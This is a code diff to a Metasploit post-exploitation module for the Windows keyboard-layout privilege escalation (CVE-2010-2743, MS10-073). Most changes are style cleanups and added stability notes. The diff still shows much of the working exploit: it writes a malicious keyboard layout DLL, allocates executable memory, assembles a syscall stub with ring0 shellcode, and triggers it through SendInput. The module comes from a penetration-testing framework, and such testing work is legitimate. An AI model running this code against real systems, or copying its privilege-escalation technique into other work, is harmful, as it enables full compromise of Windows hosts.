@@ -30,7 +30,7 @@ class MetasploitModule < Msf::Post
           [ 'OSVDB', '68552' ],
           [ 'CVE', '2010-2743' ],
           [ 'MSB', 'MS10-073' ],
-          [ 'URL', 'http://www.reversemode.com/index.php?option=com_content&task=view&id=71&Itemid=1' ],
+          [ 'URL', 'https://web.archive.org/web/20160308010201/http://www.reversemode.com/index.php?option=com_content&task=view&id=71&Itemid=1' ],
           [ 'EDB', '15985' ]
         ],
         'DisclosureDate' => '2010-10-12',
@@ -48,6 +48,11 @@ class MetasploitModule < Msf::Post
               stdapi_sys_process_getpid
             ]
           }
+        },
+        'Notes' => {
+          'Stability' => [CRASH_OS_DOWN],
+          'SideEffects' => [ARTIFACTS_ON_DISK],
+          'Reliability' => []
         }
       )
     )
@@ -56,7 +61,8 @@ class MetasploitModule < Msf::Post
   def run
     mem_base = nil
     dllpath = nil
-    hDll = false
+    hdll = false
+
     version = get_version_info
     unless version.build_number.between?(Msf::WindowsVersion::Win2000, Msf::WindowsVersion::Win7_SP0)
       print_error("#{version.product_name} is not vulnerable.")
@@ -174,7 +180,7 @@ class MetasploitModule < Msf::Post
       "\x00\x00\x00\x00\x00\x00"
 
     pid = session.sys.process.getpid
-    print_status('Attempting to elevate PID 0x%x' % pid)
+    print_status(format('Attempting to elevate PID 0x%<pid>x', pid: pid))
 
     # Prepare the shellcode (replace platform specific stuff, and pid)
     ring0_code.gsub!('FFFF', [flink_off].pack('V'))
@@ -200,7 +206,7 @@ class MetasploitModule < Msf::Post
       print_error("Unable to open #{dllpath}")
       return
     end
-    hDll = ret['return']
+    hdll = ret['return']
     print_status("Wrote malicious keyboard layout to #{dllpath} ..")
 
     # Allocate some RWX virtual memory for our use..
@@ -209,10 +215,10 @@ class MetasploitModule < Msf::Post
     mem_size += (0x1000 - (mem_size % 0x1000))
     mem = session.railgun.kernel32.VirtualAlloc(mem_base, mem_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
     if (mem['return'] != mem_base)
-      print_error('Unable to allocate RWX memory @ 0x%x' % mem_base)
+      print_error(format('Unable to allocate RWX memory @ 0x%<mem_base>x', mem_base: mem_base))
       return
     end
-    print_status(format('Allocated 0x%x bytes of memory @ 0x%x', mem_size, mem_base))
+    print_status(format('Allocated 0x%<mem_size>x bytes of memory @ 0x%<mem_base>x', mem_size: mem_size, mem_base: mem_base))
 
     # Initialize the buffer to contain NO-OPs
     nops = "\x90" * mem_size
@@ -230,11 +236,11 @@ class MetasploitModule < Msf::Post
     end
 
     # InitializeUnicodeStr(&uStr,L"pwn3d.dll"); -- Is this necessary?
-    pKLID = mem_base
-    pStr = pKLID + (2 + 2 + 4)
+    pklid = mem_base
+    pstr = pklid + (2 + 2 + 4)
     kbd_name = 'pwn3d.dll'
     uni_name = Rex::Text.to_unicode(kbd_name + "\x00")
-    ret = session.railgun.memwrite(pStr, uni_name, uni_name.length)
+    ret = session.railgun.memwrite(pstr, uni_name, uni_name.length)
     if !ret
       print_error('Unable to copy unicode string data')
       return
@@ -242,9 +248,9 @@ class MetasploitModule < Msf::Post
     unicode_str = [
       kbd_name.length * 2,
       uni_name.length,
-      pStr
+      pstr
     ].pack('vvV')
-    ret = session.railgun.memwrite(pKLID, unicode_str, unicode_str.length)
+    ret = session.railgun.memwrite(pklid, unicode_str, unicode_str.length)
     if !ret
       print_error('Unable to copy UNICODE_STRING structure')
       return
@@ -257,8 +263,8 @@ class MetasploitModule < Msf::Post
       print_error('Unable to GetKeyboardLayout')
       return
     end
-    hKL = ret['return']
-    print_status('Current Keyboard Layout: 0x%x' % hKL)
+    hkl = ret['return']
+    print_status('Current Keyboard Layout: 0x%x' % hkl)
 
 # _declspec(naked) HKL __stdcall NtUserLoadKeyboardLayoutEx(
 #  IN HANDLE Handle,
@@ -284,7 +290,7 @@ class MetasploitModule < Msf::Post
         [ 'DWORD', 'dwKLID', 'in' ],
         [ 'DWORD', 'Flags', 'in' ]
       ])
-    ret = session.railgun.ntdll.KiFastSystemCall(dll_fd, 0x1ae0160, nil, hKL, pKLID, 0x666, 0x101)
+    ret = session.railgun.ntdll.KiFastSystemCall(dll_fd, 0x1ae0160, nil, hkl, pklid, 0x666, 0x101)
     print_status(ret.inspect)
 =end
 
@@ -294,11 +300,11 @@ class MetasploitModule < Msf::Post
       pop esi
       push 0x101
       push 0x666
-      push #{'0x%x' % pKLID}
-      push #{'0x%x' % hKL}
+      push #{'0x%x' % pklid}
+      push #{'0x%x' % hkl}
       push 0
       push 0x1ae0160
-      push #{'0x%x' % hDll}
+      push #{'0x%x' % hdll}
       push esi
       #{syscall_stub}
     EOS
@@ -313,7 +319,7 @@ class MetasploitModule < Msf::Post
       print_error('Unable to copy system call stub')
       return
     end
-    print_status('Patched in syscall wrapper @ 0x%x' % func_ptr)
+    print_status(format('Patched in syscall wrapper @ 0x%<func_ptr>x', func_ptr: func_ptr))
 
     # GO GO GO
     ret = session.railgun.kernel32.CreateThread(nil, 0, func_ptr, nil, 'CREATE_SUSPENDED', nil)
@@ -333,7 +339,7 @@ class MetasploitModule < Msf::Post
 
     # Now, send some input to cause ring0 payload execution...
     print_status('Attempting to cause the ring0 payload to execute...')
-    vInput = [
+    vinput = [
       1, # INPUT_KEYBOARD - input type
       # KEYBDINPUT struct
       0x0,  # wVk
@@ -344,20 +350,20 @@ class MetasploitModule < Msf::Post
       0x0,  # pad 1
       0x0   # pad 2
     ].pack('VvvVVVVV')
-    ret = session.railgun.user32.SendInput(1, vInput, vInput.length)
+    ret = session.railgun.user32.SendInput(1, vinput, vinput.length)
     print_status('SendInput: ' + ret.inspect)
   ensure
     # Clean up
     if mem_base
       ret = session.railgun.kernel32.VirtualFree(mem_base, 0, MEM_RELEASE)
       if !(ret['return'])
-        print_error('Unable to free memory @ 0x%x' % mem_base)
+        print_error(format('Unable to free memory @ 0x%<mem_base>x', mem_base: mem_base))
       end
     end
 
     # dll_fd.close
-    if hDll
-      ret = session.railgun.kernel32.CloseHandle(hDll)
+    if hdll
+      ret = session.railgun.kernel32.CloseHandle(hdll)
       if !(ret['return'])
         print_error('Unable to CloseHandle')
       end
@@ -365,5 +371,4 @@ class MetasploitModule < Msf::Post
 
     session.fs.file.rm(dllpath) if dllpath
   end
-
 end
